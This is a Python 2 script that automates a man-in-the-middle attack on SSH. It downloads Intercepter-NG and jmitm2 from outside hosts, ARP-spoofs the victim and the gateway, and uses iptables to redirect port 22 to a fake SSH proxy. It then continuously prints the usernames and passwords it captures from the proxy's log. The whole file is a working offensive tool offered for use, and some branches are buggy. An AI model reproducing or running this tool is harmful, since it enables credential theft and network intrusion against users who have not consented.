from optparse import OptionParser
from scapy.all import *
from subprocess import Popen, PIPE, call
from threading import Timer
import argparse
import commands
import inspect, os, sys
import re
import shlex
import signal
import subprocess, datetime, os, time, signal
import threading
import time
import traceback

passwordList = []

defaultHostMac = ''
defaultGatewayMac = ''
defaultHostIP = ''
defaultGatewayIP = ''

#currentPath=os.getcwd()
currentPath="/tmp1/tools"
origPath=os.getcwd()

def signal_handler(signal, frame):
	print('\nYou pressed Ctrl+C!')

	#Kill ARP Spoofing
        cmd = "pkill -f intercepter"
        commands.getoutput(cmd)
        cmd = "killall -15 screen"
        commands.getoutput(cmd)

	#Flushing IPTables
	cmd = "iptables -F"
        commands.getoutput(cmd)

	print "[*] Restoring ARP"
	#print defaultHostIP, defaultHostMac
	#print defaultGatewayIP, defaultGatewayMac
	send(ARP(op=2, pdst=defaultGatewayIP, psrc=defaultHostIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=defaultHostMac), count=3, verbose=False)
    	send(ARP(op=2, pdst=defaultHostIP, psrc=defaultGatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=defaultGatewayMac), count=3, verbose=False)
        
	sys.exit(0)

def getMac(ip):
	Popen(["ping", "-c 1", str(ip)], stdout = PIPE)
	pid = Popen(["arp", "-n", str(ip)], stdout = PIPE)
	s = pid.communicate()[0]
	mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
	return str(ip),str(mac)

def decorateScreenStringWindow(screenname, id, a):
    return  "screen -x " + screenname + " -p"+ str(id) +" -X stuff " +"'"+   a + "\r'"

def decorateDefaultString( screenname, a):
    return "screen -x  " +  screenname  + " -X " + a 

def create_screen(sname, windowname = "bash"):
    createscreen = ["screen -d -m -S "+ sname + " -t " + windowname]
    p = subprocess.Popen(createscreen,shell=True)

def run_cmd_screen(sname, id, command):
    cmd = [decorateScreenStringWindow(sname, id, command)]
    subprocess.Popen(cmd, shell=True)
    time.sleep(0.3)
 
def create_window(sname, windowname):
    cmd = [decorateDefaultString(sname, " screen -t \"" + windowname + "\" ")]
    subprocess.Popen(cmd, shell=True)
    time.sleep(0.2)

def downloadFiles():
	cmdList=[]
	if not os.path.exists(currentPath+"/jmitm2-0.1.0/bin/runm.sh"):
	        cmd="wget http://www.david-guembel.de/uploads/media/jmitm2-0.1.0.tar.gz"
	        cmdList.append(cmd)
	        cmd="tar xvfz jmitm2-0.1.0.tar.gz"
	        cmdList.append(cmd)
	else:
	        cmd="tar xvfz jmitm2-0.1.0.tar.gz"
	        cmdList.append(cmd)
	for cmd in cmdList:
		#print cmd
		os.chdir(currentPath)
	       	commands.getoutput(cmd).strip()

	cmdList=[]
	if not os.path.exists(currentPath+"/intercepter_linux"):
	        cmd="wget http://intercepter.nerf.ru/Intercepter-NG.CE.05.zip"
	        cmdList.append(cmd)
	        cmd="unzip -o Intercepter-NG.CE.05.zip"
	        cmdList.append(cmd)
	        cmd="chmod 755 "+currentPath+"/intercepter_linux"
	        cmdList.append(cmd)
	else:
	        cmd="unzip -o Intercepter-NG.CE.05.zip"
	        cmdList.append(cmd)
	        cmd="chmod 755 intercepter_linux"
	        cmdList.append(cmd)
	for cmd in cmdList:
		#print cmd
		os.chdir(currentPath)
	       	commands.getoutput(cmd).strip()

	#if not os.path.exists(currentPath+"/PCredz/Pcredz"):
	#        cmd="git clone https://github.com/lgandx/PCredz.git"
	#	print cmd
	#	os.chdir(currentPath)
	#        commands.getoutput(cmd).strip()

def runWithTimeOut(command,timeout):
    	cmd = command.split(" ")
    	start = datetime.datetime.now()
    	process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    	while process.poll() is None:
        	time.sleep(0.1)
        	now = datetime.datetime.now()
        	if (now - start).seconds > timeout:
            		os.kill(process.pid, signal.SIGKILL)
            		os.waitpid(-1, os.WNOHANG)
            		return None
    	return process.stdout.read()
	print stderr

def get_process_children(pid):
    	p = Popen('ps --no-headers -o pid --ppid %d' % pid, shell = True,stdout = PIPE, stderr = PIPE)
    	stdout, stderr = p.communicate()
    	return [int(p) for p in stdout.split()]

def runCommands(host_addr,gatewayIP):
	cmd = "pkill -f intercepter"
	commands.getoutput(cmd)
	#cmd = "pkill -f Pcredz"
	#commands.getoutput(cmd)
	cmd = "pkill -f j2ssh"
	commands.getoutput(cmd)

	cmd = "killall -15 screen"
	commands.getoutput(cmd)

	create_screen("intercepter","intercepter")
	#create_screen("pcredz","pcredz")
	create_screen("jmitm","pcredz")

	cmdList=[]
	cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
	cmdList.append(cmd)
	cmd = "iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2200"
	#cmd = "iptables -A PREROUTING -t nat -p tcp --dport 22 -j REDIRECT --to-port 2200"
	#cmd = "iptables -A PREROUTING -t nat -i eth0 -p tcp --src "+host_addr+" --dport 22 -j REDIRECT --to-port 2200"
	cmdList.append(cmd)
	cmd = "iptables -A FORWARD -j ACCEPT"
	cmdList.append(cmd)
	cmd = "iptables-save"
	cmdList.append(cmd)
	cmd = currentPath+"/intercepter_linux 1 1"
	#cmd = currentPath+"/intercepter_linux 1 1 w -gw "+gatewayIP+" -t1 "+host_addr
	cmdList.append(cmd)
	for cmd in cmdList:
		#print cmd
		run_cmd_screen("intercepter",0,cmd)
	
	#cmdList=[]	
	#cmd = "cd "+currentPath+"/PCredz && python2.7 Pcredz -i eth0"
	#print cmd
	#cmdList.append(cmd)
	#for cmd in cmdList:
	#        run_cmd_screen("pcredz",0,cmd)
	
	cmdList=[]
	cmd = "cd "+currentPath+"/jmitm2-0.1.0/bin && sh runm.sh | tee jmitm2.log"
	#print cmd
	cmdList.append(cmd)
	for cmd in cmdList:
	        run_cmd_screen("jmitm",0,cmd)

	os.chdir(origPath)

def analyzeNetwork(targetPort):
	print "[*] Analyzing network"
	cmd = "/sbin/ifconfig eth0 | grep 'inet addr' | awk -F: '{print $2}' | awk '{print $1}'"
	ethIP = commands.getoutput(cmd).strip()

	#Flushing IPTables
	cmd = "iptables -F"
        commands.getoutput(cmd)
	
	#Run ARP Spoofing
        cmd = "pkill -f intercepter"
        commands.getoutput(cmd)
        cmd = "killall -15 screen"
        commands.getoutput(cmd)

	create_screen("intercepter","intercepter")
        cmdList=[]
        cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
        cmdList.append(cmd)
        cmd = "iptables -A FORWARD -j ACCEPT"
        cmdList.append(cmd)
        cmd = currentPath+"/intercepter_linux 1 1"
        #print cmd
        cmdList.append(cmd)
        for cmd in cmdList:
                run_cmd_screen("intercepter",0,cmd)
	
	#Remove temp file
	tempFilename = "/tmp/out"
	if os.path.exists(tempFilename):
		os.remove(tempFilename)
	#cmd = "tshark -i eth0 -T fields -e ip.src -e ip.dst"
	
	#Checking if Network is Vulnerable to ARP Spoofing
	#Add Code Here

	#Checking for SSH traffic
	cmd = "tshark -i eth0 port "+targetPort+" and host not "+ethIP+" -T fields -e ip.src -e ip.dst -e tcp.port 2>&1 >> "+tempFilename
	newCmd = "bash -c '(sleep 20; pkill -f tshark) & "+cmd+"'"
	
	#newCmd = "perl -e 'alarm 10; exec @ARGV' '"+cmd+"'"
	#print cmd
	
	#print runWithTimeOut(cmd,20)
	commands.getoutput(newCmd)
	
	#time.sleep(5)	
	targetHosts=[]
	sourceHosts=[]
	if os.path.exists(tempFilename):
		lines=[]
		with open(tempFilename) as f:
	    		lines = f.read().splitlines()
			if len(lines)<1:
				print "[!!] No port: "+targetPort+" connections detected"
			else:
				for line in lines:
					host = line.split("\t")
					sourceIP = host[0].strip()
					targetIP = host[1].strip()

					srcPort = (host[2].split(",")[0]).strip()
					tgtPort = (host[2].split(",")[1]).strip()

					if srcPort==targetPort:
						if [sourceIP,targetIP] not in targetHosts:
							targetHosts.append([sourceIP,targetIP])
				return targetHosts
				#for x in targetHosts:
				#	print x[0]+"\t"+x[1]
	else:
		print "[!] No port: "+targetPort+" connections detected"
		

	#Kill ARP Spoofing
        cmd = "pkill -f intercepter"
        commands.getoutput(cmd)
        cmd = "killall -15 screen"
        commands.getoutput(cmd)

	#Flushing IPTables
	cmd = "iptables -F"
        commands.getoutput(cmd)
	
def modifyConfiguration(host_addr,ssh_addr,currentIP):
	configFile = currentPath+"/jmitm2-0.1.0/bin/conf/server.xml"
	content=[]
	newContent=[]
	with open(configFile) as f:
    		content = f.readlines()
	for x in content:
		if "<ListenAddress>" in x:
			x = "<ListenAddress>"+currentIP+"</ListenAddress>"
		newContent.append(x)
	f = open(configFile, 'w')		
	for x in newContent:
		f.write(x)
	f.close()

	configFile = currentPath+"/jmitm2-0.1.0/bin/runm.sh"
	f = open(configFile, 'w')		
	f.write("CLASSPATH=$CLASSPATH:$PWD:$PWD/lib/log4j-1.2.6.jar java -Dsshtools.home=$PWD com.sshtools.j2ssh.MitmGlue "+ssh_addr+" 22")
	f.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-analyze', action='store_true', help='[analyze network for ssh traffic]')
    parser.add_argument('-port', dest='port_no',  action='store', help='[port of SSH server]')
    parser.add_argument('-host', dest='host_addr',  action='store', help='[ip address of internal host]')
    parser.add_argument('-ssh', dest='ssh_addr',  action='store', help='[ip address of ssh server]')

    options = parser.parse_args()
    if not options.analyze and not options.ssh_addr and not options.host_addr:
	cmd = "pkill -f intercepter"
	commands.getoutput(cmd)
	cmd = "pkill -f Pcredz"
	commands.getoutput(cmd)
	cmd = "pkill -f j2ssh"
	commands.getoutput(cmd)

	cmd = "killall -15 screen"
	commands.getoutput(cmd)

	cmd = "iptables --flush"
	commands.getoutput(cmd)

    	parser.print_help()
        sys.exit(1)
    signal.signal(signal.SIGINT, signal_handler)
    if options.analyze and not options.port_no:
   	downloadFiles()

	targetPort=22
    	targetHosts=analyzeNetwork(str(targetPort))
    	if targetHosts!=None:
		if len(targetHosts)>0:
			for host in targetHosts:
				#print host[0]+"\t"+host[1]
				print "**********************************************************"
				print "Found the below SSH connections"
				print "Host: "+host[1]+"\tSSH Server: "+host[0]
				print "**********************************************************"
				#cmd = "python2.7 mitmSSH.py -host "+host[1]+" -ssh "+host[0]
				#print cmd
			#'''
			for host in targetHosts:
				ssh_addr = host[0]
				host_addr = host[1]	

				cmd = "/sbin/ifconfig eth0 | grep 'inet addr' | awk -F: '{print $2}' | awk '{print $1}'"
				ethIP = commands.getoutput(cmd).strip()

				print "[*] MITMing Target IP: "+host_addr+" and SSH server: "+ssh_addr
				modifyConfiguration(host_addr,ssh_addr,ethIP)

			        cmd = "/sbin/ip route | awk '/default/ { print $3 }'"
        			gatewayIP = commands.getoutput(cmd).strip()

				runCommands(host_addr,gatewayIP)

				defaultGatewayIP, defaultGatewayMac = getMac(str(gatewayIP))
				defaultHostIP, defaultHostMac = getMac(str(host_addr))

				
				print "[*] Checking jmitm2.log for login attempts"
				while True:
					#Check jmitm2.log for login attempts
					cmd = "cat "+currentPath+"/jmitm2-0.1.0/bin/jmitm2.log | grep -i 'mitm: username/password'"
					results = commands.getoutput(cmd).strip()
					resultsList = results.split("\n")
					for i in resultsList:
						try:
							result = i.split("- mitm:")[1].strip()
							if result not in passwordList:
								print result
								passwordList.append(result)
						except IndexError:
							continue
					time.sleep(1)
			#'''
		else:
			print "[!!!] No port: "+str(targetPort)+" traffic detected or network not vulnerable to ARP spoofing"
    elif options.analyze and options.port_no:
   	downloadFiles()

	targetPort=options.port_no
    	targetHosts=analyzeNetwork(str(targetPort))
    	if targetHosts!=None:
		if len(targetHosts)>0:
			for host in targetHosts:
				print host[0]+"\t"+host[1]
				print "**********************************************************"
				print "Found the below SSH connections"
				print "Host: "+host[1]+"\tSSH Server: "+host[0]
				print "**********************************************************"
				#cmd = "python2.7 mitmSSH.py -host "+host[1]+" -ssh "+host[0]
				#print cmd
			#'''
			if options.port_no=="22":
				for host in targetHosts:
					ssh_addr = host[0]
					host_addr = host[1]	

					cmd = "/sbin/ifconfig eth0 | grep 'inet addr' | awk -F: '{print $2}' | awk '{print $1}'"
					ethIP = commands.getoutput(cmd).strip()

					print "[*] MITMing Target IP: "+host_addr+" and SSH server: "+ssh_addr
					modifyConfiguration(host_addr,ssh_addr,ethIP)
					runCommands(options.host_addr,gatewayIP)

					defaultGatewayIP, defaultGatewayMac = getMac(str(gatewayIP))
					defaultHostIP, defaultHostMac = getMac(str(options.host_addr))

					print "[*] Checking jmitm2.log for login attempts"
					while True:
						#Check jmitm2.log for login attempts
						cmd = "cat "+currentPath+"/jmitm2-0.1.0/bin/jmitm2.log | grep -i 'mitm: username/password'"
						results = commands.getoutput(cmd).strip()
						resultsList = results.split("\n")
						for i in resultsList:
							try:
								result = i.split("- mitm:")[1].strip()
								if result not in passwordList:
									print result
									passwordList.append(result)
							except IndexError:
								continue
						time.sleep(1)
			#'''
		else:
			print "[!!!!] No port: "+str(targetPort)+" traffic detected or network not vulnerable to ARP spoofing"
    else:
   	downloadFiles()
	cmd = "/sbin/ip route | awk '/default/ { print $3 }'"
	gatewayIP = commands.getoutput(cmd).strip()

	cmd = "/sbin/ifconfig eth0 | grep 'inet addr' | awk -F: '{print $2}' | awk '{print $1}'"
	ethIP = commands.getoutput(cmd).strip()

	modifyConfiguration(options.host_addr,options.ssh_addr,ethIP)
	runCommands(options.host_addr,gatewayIP)

	defaultGatewayIP, defaultGatewayMac = getMac(str(gatewayIP))
	defaultHostIP, defaultHostMac = getMac(str(options.host_addr))

	print "[*] Checking jmitm2.log for login attempts"
	while True:	
		#Check jmitm2.log for login attempts
		cmd = "cat "+currentPath+"/jmitm2-0.1.0/bin/jmitm2.log | grep -i 'mitm: username/password'"
		results = commands.getoutput(cmd).strip()
		resultsList = results.split("\n")
		for i in resultsList:
			try:
				result = i.split("- mitm:")[1].strip()
				if result not in passwordList:
					print result
					passwordList.append(result)
			except IndexError:
				continue
		time.sleep(1)

